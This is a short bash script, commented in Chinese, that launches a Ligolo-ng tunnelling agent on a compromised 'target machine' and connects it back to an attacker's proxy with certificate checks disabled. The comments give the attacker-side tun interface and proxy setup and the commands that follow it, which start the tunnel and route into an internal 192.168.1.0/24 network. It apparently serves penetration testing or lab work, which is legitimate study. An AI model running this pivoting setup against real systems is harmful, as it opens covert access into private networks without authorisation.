#!/bin/bash
# Ligolo-ng Agent 启动脚本（在目标机器上执行）
# 攻击机先执行：sudo ip tuntap add user kali mode tun ligolo
#               sudo ip link set ligolo up
#               ./proxy -selfcert -laddr 0.0.0.0:11601

PROXY_ADDR="10.10.10.1:11601"

# 连接到攻击机代理（忽略证书验证）
./agent -connect ${PROXY_ADDR} -ignore-cert

# 连接成功后，在攻击机 proxy 控制台执行：
# >> session        （选择会话）
# >> start          （启动隧道）
# 然后添加路由：sudo ip route add 192.168.1.0/24 dev ligolo
